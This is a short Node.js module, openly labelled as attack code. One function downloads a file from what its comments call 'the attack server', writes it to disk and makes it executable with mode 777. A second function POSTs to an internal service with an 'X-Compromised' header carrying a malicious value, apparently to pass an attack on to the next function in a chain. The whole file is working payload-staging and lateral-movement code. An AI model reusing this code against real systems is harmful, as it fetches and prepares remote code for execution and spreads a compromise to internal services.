"use strict"

const http = require("http")
const fs = require("fs");

// Begin logic for downloading a file from the attack server
function getPromise(url) {
    return new Promise((resolve, reject) => {
	http.get(url, (response) => {
	    let chunks_of_data = [];

	    response.on('data', (fragments) => {
		chunks_of_data.push(fragments);
	    });

	    response.on('end', () => {
		let response_body = Buffer.concat(chunks_of_data);
		resolve(response_body.toString());
	    });

	    response.on('error', (error) => {
		reject(error);
	    });
	});
    });
}

async function downloadFile(server, file) {
    try {
	console.log('Start of downloadFile');
	var url = 'http://' + server + '/' + file;
	console.log('URL: ' + url);

	let http_promise = getPromise(url);
	let response_body = await http_promise;

	fs.writeFileSync(file, response_body, (err) => {
	    if (err) throw err;
	});

	console.log('Script downloaded.');

	console.log(response_body);

	console.log('Making script executable');

	fs.chmod(file, 0o777, err => {
	    if (err) throw err;
	});

	console.log('Script permissions changed.');
    } catch (error) {
	console.log(error);
    }
}
// End logic for downloading a file from the attack server

function httpPost(options) {
    return new Promise((resolve, reject) => {
	const req = http.request({
	    method: 'POST',
	    ...options,
	}, res => {
	    const chunks = [];
	    res.on('data', data => chunks.push(data));
	    res.on('end', () => {
		let body = Buffer.concat(chunks);
		resolve(body.toString());
	    })
	})
	req.on('error', reject);
	req.write('{}');
	req.end();
    })
}

// Begin logic for passing malicious header to internal function
async function callNextFunction(host, targetPort, targetFunc, maliciousValue, cb) {
    console.log(host + ' ' + targetPort + ' ' + targetFunc);
    const res = await httpPost({
	hostname: host,
	port: targetPort,
	path: targetFunc,
	headers: {
	    'X-Compromised': maliciousValue
	}
    });

    cb(null, res);

}

// End logic for passing malicious header to internal function

module.exports = {downloadFile, callNextFunction}
